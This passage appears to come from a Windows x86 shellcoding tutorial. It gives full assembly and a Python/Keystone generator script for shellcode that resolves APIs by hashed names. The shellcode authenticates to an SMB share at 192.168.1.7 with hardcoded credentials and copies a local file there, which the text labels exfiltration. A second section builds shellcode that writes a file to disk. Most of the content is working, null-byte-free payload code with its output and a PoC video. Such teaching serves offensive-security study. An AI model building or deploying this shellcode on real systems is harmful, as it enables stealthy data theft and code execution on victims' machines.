    call  dword ptr [ebp+0x18]   ; ExitProcess(0)
```

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1807" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1807"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1807" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1807" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="180" rx="10" fill="url(#bg_s1807)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1807)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1807)" font-weight="bold">CopyFileA File Exfiltration + ExitProcess</text>
  <rect x="50" y="48" width="300" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="200" y="66" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Source (local)</text>
  <text x="200" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">"c:\proof.txt" 3 DWORDs + null</text>
  <rect x="400" y="48" width="310" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="555" y="66" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Destination (remote)</text>
  <text x="555" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">"\\192.168.1.7\share\proof.txt" 8 DWORDs</text>
  <line x1="350" y1="70" x2="395" y2="70" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s1807)"/>
  <rect x="50" y="108" width="420" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="260" y="128" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">CopyFileA(src, dest, FALSE)</text>
  <rect x="490" y="108" width="220" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="600" y="128" text-anchor="middle" fill="#8b949e" font-size="11">ExitProcess(0)</text>
  <rect x="50" y="148" width="660" height="22" rx="3" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="380" y="164" text-anchor="middle" fill="#8b949e" font-size="9">bFailIfExists=FALSE overwrites if file exists at destination</text>
</svg></div>

*Figure 18.e -- CopyFileA copies the local file to the authenticated SMB share, then ExitProcess terminates cleanly.*

### Complete SMB File Copy Flow

<div align="center"><svg viewBox="0 0 750 170" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1802" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1802"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1802" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1802" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="170" rx="10" fill="url(#bg_s1802)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1802)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1802)" font-weight="bold">SMB File Exfiltration Pipeline</text>

  <rect x="25" y="50" width="115" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="82" y="66" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve APIs</text>
  <text x="82" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">k32 + mpr.dll</text>
  <line x1="140" y1="70" x2="158" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1802)"/>

  <rect x="163" y="50" width="130" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="228" y="66" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">Build NETRESOURCE</text>
  <text x="228" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">UNC + creds</text>
  <line x1="293" y1="70" x2="311" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1802)"/>

  <rect x="316" y="50" width="145" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="388" y="66" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">WNetAddConnection2A</text>
  <text x="388" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">authenticate to share</text>
  <line x1="461" y1="70" x2="479" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1802)"/>

  <rect x="484" y="50" width="125" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="546" y="66" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">CopyFileA</text>
  <text x="546" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">local → remote</text>
  <line x1="609" y1="70" x2="627" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1802)"/>

  <rect x="632" y="50" width="90" height="40" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="677" y="66" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="bold">Exit</text>
  <text x="677" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">clean</text>

  <rect x="50" y="110" width="650" height="45" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="130" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Data Exfiltration over SMB</text>
  <text x="375" y="148" text-anchor="middle" fill="#8b949e" font-size="10">c:\proof.txt → \\192.168.1.7\share\proof.txt (authenticated with smbuser/smbpass)</text>
</svg></div>

*Figure 18.2 -- SMB file exfiltration pipeline. The shellcode authenticates to the remote share with credentials and copies the target file.*

### Full Shellcode Source (`smb_copy.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x07                 ;"  #   7 + 6 = 13
    "   ror   edx, 0x06                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0x99ec895e                ;"  #   CopyFileA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x73e2d87e                ;"  #   ExitProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"

    " load_mpr_dll:                      "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x64                  ;"  #   "dll\0"
    "   push  eax                       ;"
    "   push  0x2e72706d                ;"  #   "mpr."
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x10]      ;"  #   LoadLibraryA("mpr.dll")

    " resolve_symbols_mpr_dll:           "
    "   mov   ebx, eax                  ;"
    "   push  0xd7d23576                ;"  #   WNetAddConnection2A
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"

    " netresource_struct_build:          "
    "   xor   eax, eax                  ;"
    "   mov   al, 0x04                  ;"
    "   add   al, 0x1c                  ;"  #   0x20 = 32 bytes
    "   xor   ecx, ecx                  ;"
    "   mov   cl, al                    ;"
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   xor   eax, eax                  ;"
    "   rep   stosb                     ;"  #   zero fill
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"

    # Build credentials and share path
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x7265                ;"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x73                  ;"  #   "ser\0"
    "   push  eax                       ;"
    "   push  0x75626d73                ;"  #   "smbu"
    "   mov   esi, esp                  ;"
    "   mov   [ebp+0x20], esi           ;"  #   username = "smbuser"

    "   xor   esi, esi                  ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x7373                ;"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x61                  ;"  #   "ass\0"
    "   push  eax                       ;"
    "   push  0x70626d73                ;"  #   "smbp"
    "   mov   esi, esp                  ;"
    "   mov   [ebp+0x24], esi           ;"  #   password = "smbpass"

    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6572                ;"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x61                  ;"  #   "are\0"
    "   push  eax                       ;"
    "   push  0x68735c37                ;"  #   "7\sh"
    "   push  0x2e312e38                ;"  #   "8.1."
    "   push  0x36312e32                ;"  #   "2.16"
    "   push  0x39315c5c                ;"  #   "\\19"
    "   mov   esi, esp                  ;"  #   "\\192.168.1.7\share"

    " netresource_struct_values:         "
    "   xor   eax, eax                  ;"
    "   mov   dword ptr [edi], eax      ;"  #   dwScope = 0
    "   inc   eax                       ;"
    "   mov   dword ptr [edi+0x04], eax ;"  #   dwType = DISK
    "   dec   eax                       ;"
    "   mov   dword ptr [edi+0x08], eax ;"
    "   mov   dword ptr [edi+0x0C], eax ;"
    "   mov   dword ptr [edi+0x10], eax ;"  #   lpLocalName = NULL
    "   mov   eax, esi                  ;"
    "   mov   dword ptr [edi+0x14], eax ;"  #   lpRemoteName
    "   xor   eax, eax                  ;"
    "   mov   dword ptr [edi+0x18], eax ;"
    "   mov   dword ptr [edi+0x1C], eax ;"

    " call_WNetAddConnection2A:          "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   dwFlags = 0
    "   push  dword ptr [ebp+0x20]      ;"  #   lpUserName
    "   push  dword ptr [ebp+0x24]      ;"  #   lpPassword
    "   push  edi                       ;"  #   lpNetResource
    "   call  dword ptr [ebp+0x1C]      ;"  #   WNetAddConnection2A

    " call_CopyFileA:                    "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   al, 0x74                  ;"
    "   push  eax                       ;"  #   "t\0"
    "   push  0x78742e66                ;"  #   "f.tx"
    "   push  0x6f6f7270                ;"  #   "proo"
    "   push  0x5c657261                ;"  #   "are\\"
    "   push  0x68735c37                ;"  #   "7\\sh"
    "   push  0x2e312e38                ;"  #   "8.1."
    "   push  0x36312e32                ;"  #   "2.16"
    "   push  0x39315c5c                ;"  #   "\\\\19"
    "   mov   esi, esp                  ;"  #   dest = "\\\\192.168.1.7\\share\\proof.txt"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  0x7478742e                ;"  #   ".txt"
    "   push  0x666f6f72                ;"  #   "roof"
    "   push  0x705c3a63                ;"  #   "c:\\p"
    "   mov   ebx, esp                  ;"  #   src = "c:\\proof.txt"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   bFailIfExists = FALSE
    "   push  esi                       ;"  #   lpNewFileName
    "   push  ebx                       ;"  #   lpExistingFileName
    "   call  dword ptr [ebp+0x14]      ;"  #   CopyFileA

    " call_ExitProcess:                  "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x18]      ;"  #   ExitProcess(0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the SMB file copy shellcode authenticating to the remote share and exfiltrating `proof.txt`:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/smb-file-ops-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: SMB file copy exfiltrating proof.txt to a remote share*

---


## 19. File I/O: Writing to Disk

This shellcode creates a file on disk and writes a message to it. It resolves `CreateFileA`, `WriteFile`, and `CloseHandle` from `kernel32.dll`, creates `secretremo.txt`, writes the string "Shellcoding With Secret Remo", then terminates.

### Step 1: Resolving kernel32.dll Functions

Six function addresses are resolved from `kernel32.dll`:

**TerminateProcess** Hash: `0x78b5b983` → `[ebp+0x10]`

**LoadLibraryA** Hash: `0xec0e4e8e` → `[ebp+0x14]`

**CreateFileA** `HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)` Creates or opens a file. Hash: `0x7c0017a5` → `[ebp+0x18]`

**WriteFile** `BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)` Writes data to a file. Hash: `0xe80a791f` → `[ebp+0x1C]`

**CloseHandle** `BOOL CloseHandle(HANDLE hObject)` Closes an open handle. Hash: `0x0ffd97fb` → `[ebp+0x20]`

**TerminateProcess** Resolved a second time. Hash: `0x78b5b983` → `[ebp+0x24]`

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax
    push  0xec0e4e8e              ; LoadLibraryA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
    push  0x7c0017a5              ; CreateFileA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
    push  0xe80a791f              ; WriteFile
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax
    push  0x0ffd97fb              ; CloseHandle
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax
    push  0x78b5b983              ; TerminateProcess (again)
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax
```

<div align="center"><svg viewBox="0 0 750 170" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1903" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1903"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1903" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="170" rx="10" fill="url(#bg_s1903)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1903)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1903)" font-weight="bold">kernel32.dll API Resolution File I/O</text>
  <rect x="50" y="48" width="200" height="30" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="150" y="68" text-anchor="middle" fill="#8b949e" font-size="10">TerminateProcess → [ebp+0x10]</text>
  <rect x="275" y="48" width="200" height="30" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="375" y="68" text-anchor="middle" fill="#8b949e" font-size="10">LoadLibraryA → [ebp+0x14]</text>
  <rect x="500" y="48" width="200" height="30" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="600" y="68" text-anchor="middle" fill="#00d4ff" font-size="10">CreateFileA → [ebp+0x18]</text>
  <rect x="50" y="92" width="200" height="30" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="150" y="112" text-anchor="middle" fill="#ff3366" font-size="10">WriteFile → [ebp+0x1C]</text>
  <rect x="275" y="92" width="200" height="30" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="112" text-anchor="middle" fill="#ff6b35" font-size="10">CloseHandle → [ebp+0x20]</text>
  <rect x="500" y="92" width="200" height="30" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="600" y="112" text-anchor="middle" fill="#8b949e" font-size="10">TerminateProcess → [ebp+0x24]</text>
  <rect x="50" y="136" width="650" height="22" rx="3" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="152" text-anchor="middle" fill="#8b949e" font-size="9">6 APIs resolved via standard ROR-13 hashing from kernel32.dll export table</text>
</svg></div>

*Figure 19.a -- Six kernel32 APIs resolved for file creation, writing, cleanup, and termination.*

### Step 2: CreateFileA Creating the Output File

We create `secretremo.txt` with read/write access. The access mask `GENERIC_READ | GENERIC_WRITE` (`0xC0000000`) is built by loading `0x03` into EBX and shifting left by 30 bits:

```nasm
call_createfilea:
    xor   ecx, ecx
    mov   cl, 0x80                ; FILE_ATTRIBUTE_NORMAL (0x80)
    xor   edx, edx
    mov   dl, 0x02                ; CREATE_ALWAYS (2)
    xor   ebx, ebx
    mov   bl, 0x03
    shl   ebx, 30                 ; 0x03 << 30 = 0xC0000000
                                  ; = GENERIC_READ | GENERIC_WRITE
    ; Build filename: "secretremo.txt"
    xor   eax, eax
    mov   ax, 0x7478              ; "xt"
    push  eax
    push  0x742e6f6d              ; "mo.t"
    push  0x65727465              ; "etre"
    push  0x72636573              ; "secr"
    mov   esi, esp                ; ESI → "secretremo.txt"

    xor   eax, eax
    push  eax                     ; hTemplateFile = NULL
    push  ecx                     ; dwFlagsAndAttributes = 0x80
    push  edx                     ; dwCreationDisposition = CREATE_ALWAYS
    push  eax                     ; lpSecurityAttributes = NULL
    push  eax                     ; dwShareMode = 0
    push  ebx                     ; dwDesiredAccess = 0xC0000000
    push  esi                     ; lpFileName = "secretremo.txt"
    call  dword ptr [ebp+0x18]   ; CreateFileA
```

The `shl ebx, 30` trick avoids pushing the large constant `0xC0000000` directly, which would contain null bytes.

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1901" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1901"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1901" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1901" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1901)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1901)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1901)" font-weight="bold">CreateFileA Parameter Setup</text>

  <!-- Access mask construction -->
  <rect x="50" y="48" width="200" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="67" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Access Mask Trick</text>
  <text x="150" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">mov bl, 0x03</text>
  <text x="150" y="96" text-anchor="middle" fill="#e0e7ff" font-size="10">shl ebx, 30 → 0xC0000000</text>

  <!-- Filename -->
  <rect x="270" y="48" width="200" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="370" y="67" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Filename on Stack</text>
  <text x="370" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">"secr" "etre" "mo.t" + "xt"</text>
  <text x="370" y="96" text-anchor="middle" fill="#8b949e" font-size="9">→ "secretremo.txt"</text>

  <!-- Other params -->
  <rect x="490" y="48" width="230" height="55" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="605" y="67" text-anchor="middle" fill="#8b949e" font-size="11" font-weight="bold">Other Parameters</text>
  <text x="605" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">CREATE_ALWAYS | NORMAL</text>
  <text x="605" y="96" text-anchor="middle" fill="#e0e7ff" font-size="10">ShareMode=0, Template=NULL</text>

  <!-- Arrow to CreateFileA -->
  <line x1="150" y1="103" x2="150" y2="128" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1901)"/>
  <line x1="370" y1="103" x2="370" y2="128" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1901)"/>
  <line x1="605" y1="103" x2="605" y2="128" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1901)"/>

  <!-- CreateFileA call -->
  <rect x="50" y="133" width="670" height="35" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="385" y="155" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">CreateFileA("secretremo.txt", 0xC0000000, 0, NULL, 2, 0x80, NULL)</text>

  <!-- Return value -->
  <line x1="385" y1="168" x2="385" y2="188" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1901)"/>
  <rect x="250" y="180" width="250" height="30" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1"/>
  <text x="375" y="200" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">EAX = file handle → EBX</text>
</svg></div>

*Figure 19.1 -- CreateFileA parameter setup. The access mask 0xC0000000 is built with `shl` to avoid null bytes, and the filename "secretremo.txt" is assembled from DWORD pushes.*

### Step 3: WriteFile Writing the Message

The returned file handle is saved in EBX. We build the message "Shellcoding With Secret Remo" (28 bytes = `0x1C`) on the stack and write it to the file:

```nasm
call_writefile:
    mov   ebx, eax                ; EBX = hFile from CreateFileA
    xor   eax, eax
    push  eax                     ; bytesWritten variable (stack space)
    mov   edi, esp                ; EDI → &bytesWritten

    ; Build string: "Shellcoding With Secret Remo"
    push  0x6f6d6552              ; "Remo"
    push  0x20746572              ; "ret "
    push  0x63655320              ; " Sec"
    push  0x68746957              ; "With"
    push  0x20676e69              ; "ing "
    push  0x646f636c              ; "lcod"
    push  0x6c656853              ; "Shel"
    mov   esi, esp                ; ESI → "Shellcoding With Secret Remo"

    xor   eax, eax
    push  eax                     ; lpOverlapped = NULL
    push  edi                     ; lpNumberOfBytesWritten
    push  0x1C                    ; nNumberOfBytesToWrite = 28
    push  esi                     ; lpBuffer
    push  ebx                     ; hFile
    call  dword ptr [ebp+0x1C]   ; WriteFile
```

<div align="center"><svg viewBox="0 0 750 170" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1904" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1904"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1904" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1904" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="170" rx="10" fill="url(#bg_s1904)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1904)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1904)" font-weight="bold">WriteFile Writing Message to Disk</text>
  <rect x="50" y="48" width="250" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="175" y="66" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">File Handle (EBX)</text>
  <text x="175" y="82" text-anchor="middle" fill="#e0e7ff" font-size="10">from CreateFileA return</text>
  <rect x="320" y="48" width="250" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="445" y="66" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Message Buffer (7 DWORDs)</text>
  <text x="445" y="82" text-anchor="middle" fill="#e0e7ff" font-size="10">"Shellcoding With Secret Remo"</text>
  <rect x="590" y="48" width="120" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="650" y="66" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">0x1C bytes</text>
  <text x="650" y="82" text-anchor="middle" fill="#e0e7ff" font-size="10">= 28 chars</text>
  <line x1="175" y1="93" x2="175" y2="118" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1904)"/>
  <line x1="445" y1="93" x2="445" y2="118" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1904)"/>
  <line x1="650" y1="93" x2="650" y2="118" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1904)"/>
  <rect x="50" y="123" width="660" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="380" y="145" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">WriteFile(hFile, lpBuffer, 0x1C, &bytesWritten, NULL)</text>
</svg></div>

*Figure 19.b -- WriteFile deposits the 28-byte message into the file. The bytesWritten variable lives on the stack at EDI.*

### Step 4: CloseHandle and TerminateProcess

```nasm
call_closehandle:
    push  ebx                     ; hObject = hFile
    call  dword ptr [ebp+0x20]   ; CloseHandle

call_terminateprocess:
    xor   eax, eax
    push  eax                     ; uExitCode = 0
    dec   eax                     ; EAX = -1 (current process)
    push  eax                     ; hProcess = -1
    call  dword ptr [ebp+0x24]   ; TerminateProcess(-1, 0)
```

